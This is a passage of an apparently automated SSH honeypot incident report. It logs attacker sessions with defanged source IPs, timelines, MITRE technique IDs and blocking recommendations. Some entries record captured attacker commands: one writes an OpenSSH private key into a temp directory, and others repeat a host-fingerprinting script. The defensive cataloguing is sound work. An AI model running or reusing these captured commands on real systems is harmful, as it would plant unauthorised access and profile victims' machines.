| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:01:32` | `cowrie.session.connect` |
| `2026-08-20 17:01:32` | `cowrie.client.version` |
| `2026-08-20 17:01:32` | `cowrie.client.kex` |
| `2026-08-20 17:01:32` | `cowrie.login.success` |
| `2026-08-20 17:01:34` | `cowrie.session.params` |
| `2026-08-20 17:01:34` | `cowrie.command.input` |
| `2026-08-20 17:01:34` | `cowrie.session.file_download` |
| `2026-08-20 17:01:34` | `cowrie.session.file_download` |
| `2026-08-20 17:01:34` | `cowrie.log.closed` |
| `2026-08-20 17:01:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67976659dd1a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:01 |
| **Last Seen** | 2026-08-20 17:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:01:58` | `cowrie.session.connect` |
| `2026-08-20 17:01:58` | `cowrie.client.version` |
| `2026-08-20 17:01:58` | `cowrie.client.kex` |
| `2026-08-20 17:01:59` | `cowrie.login.success` |
| `2026-08-20 17:02:01` | `cowrie.session.params` |
| `2026-08-20 17:02:01` | `cowrie.command.input` |
| `2026-08-20 17:02:01` | `cowrie.command.input` |
| `2026-08-20 17:02:01` | `cowrie.command.input` |
| `2026-08-20 17:02:01` | `cowrie.command.input` |
| `2026-08-20 17:02:01` | `cowrie.command.input` |
| `2026-08-20 17:02:01` | `cowrie.command.success` |
| `2026-08-20 17:02:01` | `cowrie.command.input` |
| `2026-08-20 17:02:01` | `cowrie.command.input` |
| `2026-08-20 17:02:01` | `cowrie.command.input` |
| `2026-08-20 17:02:01` | `cowrie.command.input` |
| `2026-08-20 17:02:01` | `cowrie.log.closed` |
| `2026-08-20 17:02:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b6d4a577f92

| Field | Detail |
|---|---|
| **Source IP** | `177.135.206[.]10` |
| **First Seen** | 2026-08-20 17:03 |
| **Last Seen** | 2026-08-20 17:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:03:32` | `cowrie.session.connect` |
| `2026-08-20 17:03:33` | `cowrie.client.version` |
| `2026-08-20 17:03:33` | `cowrie.client.kex` |
| `2026-08-20 17:03:34` | `cowrie.login.success` |
| `2026-08-20 17:03:35` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:03:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.135.206[.]10` to AbuseIPDB if not already reported
- [ ] Block `177.135.206[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32589bc92429

| Field | Detail |
|---|---|
| **Source IP** | `111.171.127[.]190` |
| **First Seen** | 2026-08-20 17:03 |
| **Last Seen** | 2026-08-20 17:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:03:41` | `cowrie.session.connect` |
| `2026-08-20 17:03:42` | `cowrie.client.version` |
| `2026-08-20 17:03:42` | `cowrie.client.kex` |
| `2026-08-20 17:03:44` | `cowrie.login.success` |
| `2026-08-20 17:03:44` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:03:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.171.127[.]190` to AbuseIPDB if not already reported
- [ ] Block `111.171.127[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0929bce4f444

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:03 |
| **Last Seen** | 2026-08-20 17:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:03:42` | `cowrie.session.connect` |
| `2026-08-20 17:03:43` | `cowrie.client.version` |
| `2026-08-20 17:03:43` | `cowrie.client.kex` |
| `2026-08-20 17:03:44` | `cowrie.login.success` |
| `2026-08-20 17:03:46` | `cowrie.session.params` |
| `2026-08-20 17:03:46` | `cowrie.command.input` |
| `2026-08-20 17:03:46` | `cowrie.command.input` |
| `2026-08-20 17:03:46` | `cowrie.command.input` |
| `2026-08-20 17:03:46` | `cowrie.command.input` |
| `2026-08-20 17:03:46` | `cowrie.command.input` |
| `2026-08-20 17:03:46` | `cowrie.command.success` |
| `2026-08-20 17:03:46` | `cowrie.command.input` |
| `2026-08-20 17:03:46` | `cowrie.command.input` |
| `2026-08-20 17:03:46` | `cowrie.command.input` |
| `2026-08-20 17:03:46` | `cowrie.command.input` |
| `2026-08-20 17:03:46` | `cowrie.log.closed` |
| `2026-08-20 17:03:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7427f31aace2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:05 |
| **Last Seen** | 2026-08-20 17:05 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:05:21` | `cowrie.session.connect` |
| `2026-08-20 17:05:21` | `cowrie.client.version` |
| `2026-08-20 17:05:21` | `cowrie.client.kex` |
| `2026-08-20 17:05:29` | `cowrie.login.success` |
| `2026-08-20 17:05:30` | `cowrie.session.params` |
| `2026-08-20 17:05:30` | `cowrie.command.input` |
| `2026-08-20 17:05:30` | `cowrie.command.input` |
| `2026-08-20 17:05:30` | `cowrie.command.input` |
| `2026-08-20 17:05:30` | `cowrie.command.input` |
| `2026-08-20 17:05:30` | `cowrie.command.input` |
| `2026-08-20 17:05:30` | `cowrie.command.success` |
| `2026-08-20 17:05:30` | `cowrie.command.input` |
| `2026-08-20 17:05:30` | `cowrie.command.input` |
| `2026-08-20 17:05:30` | `cowrie.command.input` |
| `2026-08-20 17:05:30` | `cowrie.command.input` |
| `2026-08-20 17:05:30` | `cowrie.log.closed` |
| `2026-08-20 17:05:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0cd7f3e23a7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:06 |
| **Last Seen** | 2026-08-20 17:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:06:56` | `cowrie.session.connect` |
| `2026-08-20 17:06:56` | `cowrie.client.version` |
| `2026-08-20 17:06:56` | `cowrie.client.kex` |
| `2026-08-20 17:06:57` | `cowrie.login.success` |
| `2026-08-20 17:06:59` | `cowrie.session.params` |
| `2026-08-20 17:06:59` | `cowrie.command.input` |
| `2026-08-20 17:06:59` | `cowrie.command.input` |
| `2026-08-20 17:06:59` | `cowrie.command.input` |
| `2026-08-20 17:06:59` | `cowrie.command.input` |
| `2026-08-20 17:06:59` | `cowrie.command.input` |
| `2026-08-20 17:06:59` | `cowrie.command.success` |
| `2026-08-20 17:06:59` | `cowrie.command.input` |
| `2026-08-20 17:06:59` | `cowrie.command.input` |
| `2026-08-20 17:06:59` | `cowrie.command.input` |
| `2026-08-20 17:06:59` | `cowrie.command.input` |
| `2026-08-20 17:06:59` | `cowrie.log.closed` |
| `2026-08-20 17:06:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbfc749894bd

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 17:07 |
| **Last Seen** | 2026-08-20 17:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:07:06` | `cowrie.session.connect` |
| `2026-08-20 17:07:06` | `cowrie.client.version` |
| `2026-08-20 17:07:06` | `cowrie.client.kex` |
| `2026-08-20 17:07:09` | `cowrie.login.success` |
| `2026-08-20 17:07:11` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:07:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 17:07:12` | `cowrie.direct-tcpip.data` |
| `2026-08-20 17:07:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e0cb6261312

| Field | Detail |
|---|---|
| **Source IP** | `122.170.98[.]139` |
| **First Seen** | 2026-08-20 17:07 |
| **Last Seen** | 2026-08-20 17:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:07:28` | `cowrie.session.connect` |
| `2026-08-20 17:07:28` | `cowrie.client.version` |
| `2026-08-20 17:07:29` | `cowrie.client.kex` |
| `2026-08-20 17:07:30` | `cowrie.login.success` |
| `2026-08-20 17:07:31` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:07:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.98[.]139` to AbuseIPDB if not already reported
- [ ] Block `122.170.98[.]139` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38ed98448be1

| Field | Detail |
|---|---|
| **Source IP** | `112.31.93[.]229` |
| **First Seen** | 2026-08-20 17:07 |
| **Last Seen** | 2026-08-20 17:07 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:07:37` | `cowrie.session.connect` |
| `2026-08-20 17:07:40` | `cowrie.client.version` |
| `2026-08-20 17:07:40` | `cowrie.client.kex` |
| `2026-08-20 17:07:43` | `cowrie.login.success` |
| `2026-08-20 17:07:44` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:07:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.31.93[.]229` to AbuseIPDB if not already reported
- [ ] Block `112.31.93[.]229` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b302dc9906de

| Field | Detail |
|---|---|
| **Source IP** | `122.170.100[.]253` |
| **First Seen** | 2026-08-20 17:07 |
| **Last Seen** | 2026-08-20 17:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:07:40` | `cowrie.session.connect` |
| `2026-08-20 17:07:40` | `cowrie.client.version` |
| `2026-08-20 17:07:40` | `cowrie.client.kex` |
| `2026-08-20 17:07:42` | `cowrie.login.success` |
| `2026-08-20 17:07:42` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:07:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.100[.]253` to AbuseIPDB if not already reported
- [ ] Block `122.170.100[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19523a7f2f18

| Field | Detail |
|---|---|
| **Source IP** | `203.123.219[.]137` |
| **First Seen** | 2026-08-20 17:07 |
| **Last Seen** | 2026-08-20 17:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:07:49` | `cowrie.session.connect` |
| `2026-08-20 17:07:50` | `cowrie.client.version` |
| `2026-08-20 17:07:50` | `cowrie.client.kex` |
| `2026-08-20 17:07:53` | `cowrie.login.success` |
| `2026-08-20 17:07:53` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:07:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.123.219[.]137` to AbuseIPDB if not already reported
- [ ] Block `203.123.219[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d1f277f5148

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 17:07 |
| **Last Seen** | 2026-08-20 17:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:07:59` | `cowrie.session.connect` |
| `2026-08-20 17:07:59` | `cowrie.client.version` |
| `2026-08-20 17:08:00` | `cowrie.client.kex` |
| `2026-08-20 17:08:02` | `cowrie.login.success` |
| `2026-08-20 17:08:02` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:08:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 17:08:02` | `cowrie.direct-tcpip.data` |
| `2026-08-20 17:08:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c761dc4f541

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:08 |
| **Last Seen** | 2026-08-20 17:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:08:34` | `cowrie.session.connect` |
| `2026-08-20 17:08:35` | `cowrie.client.version` |
| `2026-08-20 17:08:35` | `cowrie.client.kex` |
| `2026-08-20 17:08:36` | `cowrie.login.success` |
| `2026-08-20 17:08:38` | `cowrie.session.params` |
| `2026-08-20 17:08:38` | `cowrie.command.input` |
| `2026-08-20 17:08:38` | `cowrie.command.input` |
| `2026-08-20 17:08:38` | `cowrie.command.input` |
| `2026-08-20 17:08:38` | `cowrie.command.input` |
| `2026-08-20 17:08:38` | `cowrie.command.input` |
| `2026-08-20 17:08:38` | `cowrie.command.success` |
| `2026-08-20 17:08:38` | `cowrie.command.input` |
| `2026-08-20 17:08:38` | `cowrie.command.input` |
| `2026-08-20 17:08:38` | `cowrie.command.input` |
| `2026-08-20 17:08:38` | `cowrie.command.input` |
| `2026-08-20 17:08:38` | `cowrie.log.closed` |
| `2026-08-20 17:08:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5d012251c37

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:10 |
| **Last Seen** | 2026-08-20 17:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:10:11` | `cowrie.session.connect` |
| `2026-08-20 17:10:11` | `cowrie.client.version` |
| `2026-08-20 17:10:11` | `cowrie.client.kex` |
| `2026-08-20 17:10:12` | `cowrie.login.success` |
| `2026-08-20 17:10:14` | `cowrie.session.params` |
| `2026-08-20 17:10:14` | `cowrie.command.input` |
| `2026-08-20 17:10:14` | `cowrie.command.input` |
| `2026-08-20 17:10:14` | `cowrie.command.input` |
| `2026-08-20 17:10:14` | `cowrie.command.input` |
| `2026-08-20 17:10:14` | `cowrie.command.input` |
| `2026-08-20 17:10:14` | `cowrie.command.success` |
| `2026-08-20 17:10:14` | `cowrie.command.input` |
| `2026-08-20 17:10:14` | `cowrie.command.input` |
| `2026-08-20 17:10:14` | `cowrie.command.input` |
| `2026-08-20 17:10:14` | `cowrie.command.input` |
| `2026-08-20 17:10:14` | `cowrie.log.closed` |
| `2026-08-20 17:10:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-694510d43e9a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:11 |
| **Last Seen** | 2026-08-20 17:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:11:48` | `cowrie.session.connect` |
| `2026-08-20 17:11:48` | `cowrie.client.version` |
| `2026-08-20 17:11:48` | `cowrie.client.kex` |
| `2026-08-20 17:11:49` | `cowrie.login.success` |
| `2026-08-20 17:11:51` | `cowrie.session.params` |
| `2026-08-20 17:11:51` | `cowrie.command.input` |
| `2026-08-20 17:11:51` | `cowrie.command.input` |
| `2026-08-20 17:11:51` | `cowrie.command.input` |
| `2026-08-20 17:11:51` | `cowrie.command.input` |
| `2026-08-20 17:11:51` | `cowrie.command.input` |
| `2026-08-20 17:11:51` | `cowrie.command.success` |
| `2026-08-20 17:11:51` | `cowrie.command.input` |
| `2026-08-20 17:11:51` | `cowrie.command.input` |
| `2026-08-20 17:11:51` | `cowrie.command.input` |
| `2026-08-20 17:11:51` | `cowrie.command.input` |
| `2026-08-20 17:11:51` | `cowrie.log.closed` |
| `2026-08-20 17:11:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54fb50fec42f

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]192` |
| **First Seen** | 2026-08-20 17:12 |
| **Last Seen** | 2026-08-20 17:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:12:25` | `cowrie.session.connect` |
| `2026-08-20 17:12:26` | `cowrie.client.version` |
| `2026-08-20 17:12:26` | `cowrie.client.kex` |
| `2026-08-20 17:12:27` | `cowrie.login.success` |
